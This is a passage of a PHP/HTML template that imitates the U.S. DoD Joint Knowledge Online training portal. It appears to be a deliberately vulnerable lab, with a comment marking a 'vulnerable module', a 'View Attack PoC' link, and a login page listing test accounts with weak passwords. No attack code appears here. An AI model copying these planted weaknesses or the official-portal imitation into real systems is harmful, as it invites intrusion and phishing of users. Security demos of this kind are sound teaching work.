    <a href="#">Help</a>
    <a href="/index.php?logout=1">Sign Out</a>
  </div>
</header>
<div class="jko-breadcrumb-bar">
  <div class="jko-breadcrumb">
    <a href="/index.php?action=dashboard">Home</a>
    <span>›</span>
    My Courses
  </div>
</div>

<div class="jko-main-bg">
  <div class="jko-content">
    <div class="jko-page-title">My Training Courses</div>
    <div class="jko-page-sub">Welcome back, <?= esc($currentUser['rank_title']) ?> <?= esc($currentUser['username']) ?> · <?= esc($currentUser['unit']) ?></div>

    <!-- Welcome strip -->
    <div class="jko-welcome-strip">
      <div class="jko-avatar"><?= strtoupper(substr($currentUser['username'], 0, 2)) ?></div>
      <div>
        <div class="jko-welcome-name"><?= esc($currentUser['rank_title']) ?> <?= esc($currentUser['username']) ?></div>
        <div class="jko-welcome-meta"><?= esc($currentUser['unit']) ?> · <?= esc($currentUser['email']) ?> · 2 of 3 courses in progress</div>
      </div>
      <div style="margin-left:auto;">
        <a href="/index.php?attack=1" class="jko-btn-ghost" style="font-size:.68rem;">View Attack PoC</a>
      </div>
    </div>

    <div class="jko-section-title">Required Training</div>
    <div class="jko-courses-grid" style="margin-top:12px;">

      <!-- Course 1 — IN PROGRESS (vulnerable module) -->
      <div class="jko-course-card">
        <div class="jko-course-card-top" style="background:#E87722;"></div>
        <div class="jko-course-card-body">
          <div class="jko-course-tag">Mandatory · Cybersecurity</div>
          <div class="jko-course-title">Cyber Security Awareness Training 2021</div>
          <div class="jko-progress-label">
            <span>Module 3 of 5</span>
            <span>60%</span>
          </div>
          <div class="jko-progress-bar">
            <div class="jko-progress-fill" style="width:60%;background:#E87722;"></div>
          </div>
          <div class="jko-course-meta">DOD-IAA-V13.0 · Due Mar 31, 2021 · 1.0 hr</div>
          <div class="jko-course-action">
            <a href="/index.php?action=module" class="jko-btn-orange">Continue</a>
            <span class="jko-badge jko-badge-blue">In Progress</span>
          </div>
        </div>
      </div>

      <!-- Course 2 — COMPLETED -->
      <div class="jko-course-card">
        <div class="jko-course-card-top" style="background:#166534;"></div>
        <div class="jko-course-card-body">
          <div class="jko-course-tag">Mandatory · Operations Security</div>
          <div class="jko-course-title">OPSEC Fundamentals</div>
          <div class="jko-progress-label">
            <span>Completed</span>
            <span>100%</span>
          </div>
          <div class="jko-progress-bar">
            <div class="jko-progress-fill" style="width:100%;background:#166534;"></div>
          </div>
          <div class="jko-course-meta">JS-US009 · Completed Feb 14, 2021 · 1.5 hr</div>
          <div class="jko-course-action">
            <a href="#" class="jko-btn-ghost" style="font-size:.68rem;">View Certificate</a>
            <span class="jko-badge jko-badge-green">Complete</span>
          </div>
        </div>
      </div>

      <!-- Course 3 — NOT STARTED -->
      <div class="jko-course-card">
        <div class="jko-course-card-top" style="background:#9ca3af;"></div>
        <div class="jko-course-card-body">
          <div class="jko-course-tag">Mandatory · Antiterrorism</div>
          <div class="jko-course-title">AT Level I Awareness Training</div>
          <div class="jko-progress-label">
            <span>Not started</span>
            <span>0%</span>
          </div>
          <div class="jko-progress-bar">
            <div class="jko-progress-fill" style="width:0%;background:#9ca3af;"></div>
          </div>
          <div class="jko-course-meta">JS-US007B · Due Jun 30, 2021 · 2.0 hr</div>
          <div class="jko-course-action">
            <a href="#" class="jko-btn-orange" style="background:#6b7280;">Start</a>
            <span class="jko-badge jko-badge-grey">Not Started</span>
          </div>
        </div>
      </div>

    </div>

    <!-- Announcements -->
    <div class="jko-section-title" style="margin-top:4px;">Announcements</div>
    <div style="margin-top:12px;background:#fff;border:1px solid #dde3ec;border-radius:5px;overflow:hidden;">
      <table style="width:100%;border-collapse:collapse;font-size:.78rem;">
        <thead>
          <tr style="background:#f0f2f5;">
            <th style="padding:8px 14px;text-align:left;font-size:.65rem;text-transform:uppercase;letter-spacing:.06em;color:#888;border-bottom:1px solid #dde3ec;">Date</th>
            <th style="padding:8px 14px;text-align:left;font-size:.65rem;text-transform:uppercase;letter-spacing:.06em;color:#888;border-bottom:1px solid #dde3ec;">Subject</th>
            <th style="padding:8px 14px;text-align:left;font-size:.65rem;text-transform:uppercase;letter-spacing:.06em;color:#888;border-bottom:1px solid #dde3ec;">From</th>
          </tr>
        </thead>
        <tbody>
          <tr style="border-bottom:1px solid #f0f0f0;">
            <td style="padding:9px 14px;color:#aaa;">Mar 5, 2021</td>
            <td style="padding:9px 14px;color:#333;font-weight:600;">⚠ Cyber Security Awareness deadline extended to Mar 31</td>
            <td style="padding:9px 14px;color:#888;">JKO Training Office</td>
          </tr>
          <tr style="border-bottom:1px solid #f0f0f0;">
            <td style="padding:9px 14px;color:#aaa;">Feb 28, 2021</td>
            <td style="padding:9px 14px;color:#333;">New course available: Insider Threat Awareness 2021</td>
            <td style="padding:9px 14px;color:#888;">JKO Training Office</td>
          </tr>
          <tr>
            <td style="padding:9px 14px;color:#aaa;">Feb 14, 2021</td>
            <td style="padding:9px 14px;color:#333;">OPSEC Fundamentals completion recorded for unit roster</td>
            <td style="padding:9px 14px;color:#888;">82nd Airborne S6</td>
          </tr>
        </tbody>
      </table>
    </div>

  </div>
</div>

<?php else: ?>
<!-- ══════════════════════════════════════════════════════════════════════════
     LOGIN PAGE
     ══════════════════════════════════════════════════════════════════════════ -->
<div class="jko-login-bg">
  <div class="jko-classbar">UNCLASSIFIED // FOR OFFICIAL USE ONLY</div>
  <div class="jko-login-body">
    <div style="width:100%;max-width:400px;">
      <div class="jko-login-card">
        <div class="jko-login-card-hdr">
          <svg class="jko-login-shield" viewBox="0 0 48 48" fill="none">
            <path d="M24 4L6 12v14c0 10 7.6 18.7 18 21 10.4-2.3 18-11 18-21V12L24 4z" fill="#1a4a7a" stroke="#E87722" stroke-width="2"/>
            <text x="24" y="30" text-anchor="middle" font-size="11" fill="#fff" font-weight="900" font-family="Arial" font-style="italic">JKO</text>
          </svg>
          <div class="jko-login-hdr-title">Joint Knowledge Online</div>
          <div class="jko-login-hdr-sub">U.S. Department of Defense · jko.jten.mil</div>
        </div>
        <div class="jko-login-body-inner">

          <?php if ($error): ?>
          <div class="jko-error"><?= esc($error) ?></div>
          <?php endif; ?>

          <form method="POST" action="/index.php">
            <div class="jko-field">
              <label>Military Email / Username</label>
              <input type="email" name="email" placeholder="you@jko.mil" required autocomplete="email">
            </div>
            <div class="jko-field">
              <label>Password / PIN</label>
              <input type="password" name="password" placeholder="Network password" required autocomplete="current-password">
            </div>
            <button type="submit" class="jko-btn-primary">Sign In</button>
          </form>

          <div style="background:#f0f0f0;border:1px solid #ddd;border-radius:4px;padding:10px 12px;margin-top:14px;font-size:11px;">
            <div style="font-size:9px;font-weight:700;text-transform:uppercase;letter-spacing:.07em;color:#888;margin-bottom:8px;">📋 Test Accounts</div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #e0e0e0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">davis@jko.mil</span><span style="font-family:monospace;font-weight:700;color:#003A70;font-size:11px;white-space:nowrap;">davis@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">Sgt</span></div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;border-bottom:1px solid #e0e0e0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">johnson@jko.mil</span><span style="font-family:monospace;font-weight:700;color:#003A70;font-size:11px;white-space:nowrap;">johnson@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">Cpl</span></div>
            <div style="display:flex;align-items:center;gap:7px;padding:3px 0;"><span style="color:#555;font-size:11px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">smith@jko.mil</span><span style="font-family:monospace;font-weight:700;color:#003A70;font-size:11px;white-space:nowrap;">smith@123</span><span style="font-size:9px;font-weight:700;padding:1px 7px;border-radius:20px;text-transform:uppercase;background:#dbeafe;color:#1d4ed8;white-space:nowrap;">PFC</span></div>
          </div>
        </div>
        <div class="jko-login-footer">
          Use of this system constitutes consent to monitoring for all lawful purposes.<br>
          Unauthorized use may result in criminal prosecution (18 U.S.C. § 1030).<br>
          For access issues contact your <a href="#">unit S6 or training coordinator</a>.
        </div>
      </div>
      <div style="text-align:center;margin-top:14px;font-size:.6rem;color:rgba(255,255,255,.2);">
        UNCLASSIFIED // FOR OFFICIAL USE ONLY · Joint Training Enterprise Network (JTEN) · © 2021
      </div>
    </div>
  </div>
</div>
<?php endif; ?>

</body>
</html>
